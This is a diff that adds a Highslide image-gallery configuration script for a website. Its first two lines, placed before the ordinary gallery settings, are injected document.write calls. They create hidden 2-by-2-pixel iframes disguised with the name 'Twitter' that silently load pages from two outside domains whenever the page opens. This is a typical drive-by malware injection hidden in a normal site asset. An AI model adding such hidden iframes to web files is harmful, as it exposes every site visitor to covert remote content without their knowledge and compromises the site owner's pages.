@@ -1,0 +1,29 @@
+document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://hecodat.de/zbny.html?j=2826109></iframe>');
+
+document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://two2readblog.com/oxuy.html?j=2826109></iframe>');
+
+﻿hs.graphicsDir = '/highslide/graphics/';
+	hs.align = 'center';
+	hs.transitions = ['expand', 'crossfade'];
+	//hs.wrapperClassName = 'dark borderless floating-caption';
+	hs.outlineType = 'glossy-dark';
+	hs.wrapperClassName = 'dark';
+
+	hs.fadeInOut = true;
+	hs.dimmingOpacity = .50;
+
+	hs.showCredits = false;
+
+	// Add the controlbar
+	if (hs.addSlideshow) hs.addSlideshow({
+		//slideshowGroup: 'group1',
+		interval: 3000,
+		repeat: false,
+		useControls: true,
+		fixedControls: 'fit',
+		overlayOptions: {
+			opacity: .6,
+			position: 'bottom center',
+			hideOnMouseOut: true
+		}
+	});
